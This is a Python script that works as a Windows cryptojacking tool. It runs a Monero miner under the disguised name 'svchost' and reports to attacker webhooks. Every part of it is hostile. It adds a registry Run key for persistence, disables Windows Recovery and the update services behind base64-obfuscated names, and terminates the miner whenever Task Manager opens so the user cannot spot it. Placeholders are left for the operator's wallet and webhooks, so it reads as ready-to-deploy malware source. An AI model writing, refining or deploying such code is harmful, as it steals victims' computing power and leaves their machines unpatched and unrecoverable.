import os, sys, time, winreg, subprocess, requests, psutil, base64, argparse

# --- 1. Identity & Dual Webhook Setup ---
parser = argparse.ArgumentParser()
parser.add_argument("--id", default="svchost")
ID = parser.parse_known_args()[0].id

# CONFIG - PUT YOUR INFO HERE
WEBHOOK_SYS = "YOUR_SYSTEM_ALERTS_WEBHOOK"
WEBHOOK_MINE = "YOUR_MINING_LOGS_WEBHOOK"
WALLET = "YOUR_MONERO_WALLET"
POOL = "pool.supportxmr.com:443"

# Obfuscated Strings
REG_RUN = base64.b64decode("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu").decode()
SVC_LIST = ["d3VhdXNlcnY=", "Yml0cw==", "ZG9zdmM="]

WORK_DIR = os.path.join(os.getenv('APPDATA'), ID)
CONFIG = {
    "MINER": os.path.join(WORK_DIR, f"{ID}.exe"),
    "WATCH": "Taskmgr.exe",
    "IDLE_PWR": "90",
    "NORM_PWR": "30"
}

def notify(msg, type="sys"):
    hook = WEBHOOK_SYS if type == "sys" else WEBHOOK_MINE
    try: requests.post(hook, json={"content": f"**[{ID}]**: {msg}"})
    except: pass

# --- 2. System Sovereignty ---
def engage_locks():
    """Persistence, Reset Disable, and Update Lockdown."""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, ID, 0, winreg.REG_SZ, f'pythonw.exe "{os.path.realpath(__file__)}" --id {ID}')
        winreg.CloseKey(key)
    except: pass
    
    subprocess.run(["reagentc", "/disable"], capture_output=True)
    for s in SVC_LIST:
        name = base64.b64decode(s).decode()
        subprocess.run(["sc", "config", name, "start=disabled"], capture_output=True)
        subprocess.run(["sc", "stop", name], capture_output=True)
    notify("Sovereignty Module: Persistence and Locks engaged.")

# --- 3. Smart Throttle & Vanishing Act ---
def manage_power():
    """Checks for Taskmgr (Vanishes) and toggles 90/30 power."""
    is_monitored = any(p.info['name'] == CONFIG["WATCH"] for p in psutil.process_iter(['name']))
    miner_proc = next((p for p in psutil.process_iter(['name']) if p.info['name'] == f"{ID}.exe"), None)

    if is_monitored:
        if miner_proc:
            try: miner_proc.terminate(); notify("Monitoring detected. Vanished.", "sys")
            except: pass
    else:
        # Check for user activity (simple check: is the CPU already being used heavily?)
        # If CPU > 20%, we assume 'Normal Use' (30% power). If < 20%, we assume 'Idle' (90% power).
        cpu_load = psutil.cpu_percent(interval=1)
        target_pwr = CONFIG["IDLE_PWR"] if cpu_load < 20 else CONFIG["NORM_PWR"]
        
        if not miner_proc:
            try:
                subprocess.Popen([CONFIG["MINER"], "-o", POOL, "-u", WALLET, "--max-cpu-usage", target_pwr, "-k", "--tls"])
                notify(f"Engine Engaged. Power: {target_pwr}%", "mine")
            except: pass
        else:
            # In a full build, you'd use a signal or API to toggle live, but restarting is more robust.
            pass

def main():
    engage_locks()
    notify("Vault Online. Monitoring system state...", "sys")
    while True:
        manage_power()
        time.sleep(20)

if __name__ == "__main__":
    main()
